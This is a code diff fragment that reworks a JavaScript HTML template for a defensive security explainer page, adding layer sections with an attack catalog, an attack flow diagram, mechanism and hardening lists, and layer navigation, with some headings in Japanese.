-              <div class="flex items-start justify-between gap-3">
-                <div class="flex items-center gap-2">
-                  <i data-lucide="${c.icon}" class="h-5 w-5 ${t.icon}" aria-hidden="true"></i>
-                  <h3 class="text-base font-bold text-slate-900 dark:text-white">${c.title}</h3>
+            <article id="${layer.id}" class="scroll-mt-24 border-t-2 ${t.border} ${t.bg} -mx-4 px-4 py-10 sm:-mx-6 sm:px-6 md:-mx-8 md:px-8">
+              <!-- Header: title + verdict + subtitle -->
+              <header class="mb-6 flex flex-wrap items-start justify-between gap-3">
+                <div class="flex items-start gap-3">
+                  <span class="inline-flex h-10 w-10 shrink-0 items-center justify-center rounded-lg ${t.badge} font-mono text-sm font-bold">${layer.number}</span>
+                  <div>
+                    <div class="flex items-center gap-2">
+                      <i data-lucide="${layer.icon}" class="h-5 w-5 ${t.icon}" aria-hidden="true"></i>
+                      <h3 class="text-xl font-bold text-slate-900 dark:text-white sm:text-2xl">${layer.title}</h3>
+                    </div>
+                    <p class="mt-1 text-sm leading-relaxed text-slate-600 dark:text-slate-300">${layer.subtitle}</p>
+                  </div>
                 </div>
-                <span class="rounded-full px-2 py-0.5 text-[11px] font-semibold ${t.badge}">${c.status}</span>
+                <span class="rounded-full px-3 py-1 text-xs font-bold ${t.badge}">${layer.verdict}</span>
+              </header>
+
+              <!-- Block 1: Attack Catalog -->
+              <section class="mb-7" aria-labelledby="${layer.id}-attacks">
+                <h4 id="${layer.id}-attacks" class="mb-3 flex items-center gap-2 text-sm font-bold uppercase tracking-wider ${t.accent}">
+                  <i data-lucide="bug" class="h-4 w-4" aria-hidden="true"></i>
+                  Attack Catalog (${layer.attacks.length})
+                </h4>
+                <div class="grid gap-3 lg:grid-cols-3">
+                  ${attacks}
+                </div>
+              </section>
+
+              <!-- Block 2: SVG Diagram -->
+              <section class="mb-7" aria-labelledby="${layer.id}-diagram">
+                <h4 id="${layer.id}-diagram" class="mb-3 flex items-center gap-2 text-sm font-bold uppercase tracking-wider ${t.accent}">
+                  <i data-lucide="git-compare-arrows" class="h-4 w-4" aria-hidden="true"></i>
+                  Attack Flow Diagram (Config A vs B)
+                </h4>
+                <div class="overflow-x-auto rounded-xl border ${t.border} bg-white p-3 shadow-sm">
+                  ${layer.svg()}
+                </div>
+              </section>
+
+              <!-- Block 3 + 4 (side by side on lg) -->
+              <div class="grid gap-6 lg:grid-cols-2">
+                <section aria-labelledby="${layer.id}-mechanism">
+                  <h4 id="${layer.id}-mechanism" class="mb-3 flex items-center gap-2 text-sm font-bold uppercase tracking-wider ${t.accent}">
+                    <i data-lucide="cog" class="h-4 w-4" aria-hidden="true"></i>
+                    なぜ Private (+ ALB) で 防げる/防げないか
+                  </h4>
+                  <ul class="space-y-3 rounded-xl border ${t.border} bg-white/70 p-4 dark:bg-slate-800/40">
+                    ${mechanism}
+                  </ul>
+                </section>
+
+                <section aria-labelledby="${layer.id}-hardening">
+                  <h4 id="${layer.id}-hardening" class="mb-3 flex items-center gap-2 text-sm font-bold uppercase tracking-wider ${t.accent}">
+                    <i data-lucide="shield-plus" class="h-4 w-4" aria-hidden="true"></i>
+                    必要な追加対策 (このレイヤー専用)
+                  </h4>
+                  <ul class="space-y-2">
+                    ${hardening}
+                  </ul>
+                </section>
               </div>
-              <p class="mt-3 text-sm leading-relaxed text-slate-700 dark:text-slate-300">${c.summary}</p>
-              <div class="mt-4 rounded-md border-l-4 border-indigo-400 bg-white/70 px-3 py-2 dark:border-indigo-500 dark:bg-slate-900/40">
-                <p class="text-[11px] font-semibold uppercase tracking-wider text-indigo-700 dark:text-indigo-300">${c.mechanismLabel}</p>
-                <p class="mt-1 text-xs leading-relaxed text-slate-700 dark:text-slate-200">${c.mechanism}</p>
-              </div>
-              <ul class="mt-3 space-y-1 border-t border-slate-200 pt-3 dark:border-slate-700">${scripts}</ul>
+
+              <!-- Footer: prev/next -->
+              <nav class="mt-8 flex items-center justify-between border-t border-slate-200 pt-4 dark:border-slate-700" aria-label="Layer navigation">
+                ${prev
+                  ? `<a href="#${prev.id}" class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-600 hover:text-indigo-600 dark:text-slate-400 dark:hover:text-indigo-300"><i data-lucide="arrow-left" class="h-4 w-4" aria-hidden="true"></i><span>${prev.number} ${prev.title}</span></a>`
+                  : `<span></span>`}
+                ${next
+                  ? `<a href="#${next.id}" class="inline-flex items-center gap-1.5 text-xs font-semibold text-slate-600 hover:text-indigo-600 dark:text-slate-400 dark:hover:text-indigo-300"><span>${next.number} ${next.title}</span><i data-lucide="arrow-right" class="h-4 w-4" aria-hidden="true"></i></a>`
+                  : `<a href="#section-defense-matrix" class="inline-flex items-center gap-1.5 text-xs font-semibold text-indigo-600 hover:text-indigo-700 dark:text-indigo-300"><span>Defense Matrix へ進む</span><i data-lucide="arrow-right" class="h-4 w-4" aria-hidden="true"></i></a>`}
+              </nav>
             </article>`;
         }).join("");
       }
